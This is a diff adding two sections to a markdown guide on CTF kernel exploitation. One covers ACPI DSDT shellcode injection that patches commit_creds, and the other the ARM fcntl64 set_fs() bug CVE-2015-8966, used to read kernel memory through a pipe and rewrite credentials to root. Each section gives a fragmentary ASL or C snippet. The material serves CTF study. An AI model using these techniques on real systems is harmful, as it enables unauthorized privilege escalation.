@@ -27,6 +27,8 @@
 - [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
 - [eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
 - [User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
+- [ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)
+- [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)
 For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
@@ -591,3 +593,44 @@ log.success(b"flag{" + io.recvuntil(b"}"))
 **Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. HITCON Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.
 
 **References:** HITCON CTF 2018 — Abyss I & II, writeups 11918, 11919, 11933, 11934, 11937, 11938
+
+---
+
+## ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)
+
+**Pattern:** "Green Computing" style challenges boot a kernel with attacker-controlled ACPI tables. Embed shellcode inside a DSDT `OperationRegion(SystemMemory, ...)` and write it into kernel memory with a `Field` write at boot. Patch a target like `commit_creds` so any subsequent setuid call elevates privileges.
+
+```asl
+OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
+Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
+JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }
+
+OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
+Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
+NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
+```
+
+**Key insight:** ACPI AML runs with direct physical memory access before normal kernel protections are active. When the challenge lets you supply DSDT/SSDT bytes, `SystemMemory` `OperationRegion` is a kernel-write primitive bigger than most explicit kernel bugs.
+
+**References:** hxp CTF 2018 — Green Computing 1-2, writeups 12550+
+
+---
+
+## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)
+
+**Pattern:** Bug: `fcntl64` on ARM Linux set `KERNEL_DS` via `set_fs()` and never restored it. Exploit: fork a child that calls `fcntl64`, then have the child write arbitrary kernel addresses through a pipe; parent reads the pipe back. Direct reads of MMU regions panic, so pipes act as a safe shim.
+
+```c
+if (fork() == 0) {
+    trigger_fcntl64_bug();                // now at KERNEL_DS
+    write(pipe_w, (void*)kernel_addr, N); // unchecked kernel read
+    _exit(0);
+}
+read(pipe_r, leak, N);                    // parent gets kernel memory
+```
+
+After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call `getuid()` to confirm root.
+
+**Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.
+
+**References:** Insomnihack teaser 2019 — 1118daysober, writeup 12903
